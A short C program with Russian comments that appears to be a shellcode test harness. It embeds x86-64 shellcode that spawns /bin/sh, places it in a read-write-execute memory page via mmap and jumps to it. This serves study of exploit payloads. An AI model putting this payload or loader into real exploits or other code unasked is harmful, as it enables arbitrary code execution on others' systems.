#include <stdio.h>
#include <string.h>
#include <sys/mman.h> // Нужен для mmap
#include <unistd.h>

// Твой шелл-код
unsigned char code[] = \
"\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x48\x31\xc0\xb0\x3b\x0f\x05";

int main() {
    printf("Shellcode Length: %ld\n", sizeof(code) - 1);

    // 1. Выделяем страницу памяти с правами PROT_EXEC | PROT_WRITE | PROT_READ
    // MAP_ANONYMOUS означает, что память не привязана к файлу.
    void *executable_mem = mmap(0, sizeof(code), 
                                PROT_READ | PROT_WRITE | PROT_EXEC, 
                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (executable_mem == MAP_FAILED) {
        perror("mmap failed");
        return 1;
    }

    // 2. Копируем наш байт-код в эту исполняемую область
    memcpy(executable_mem, code, sizeof(code));

    // 3. Создаем указатель на функцию и направляем его на новую память
    void (*ret)() = (void(*)())executable_mem;

    // 4. Передаем управление
    ret();

    return 0;
}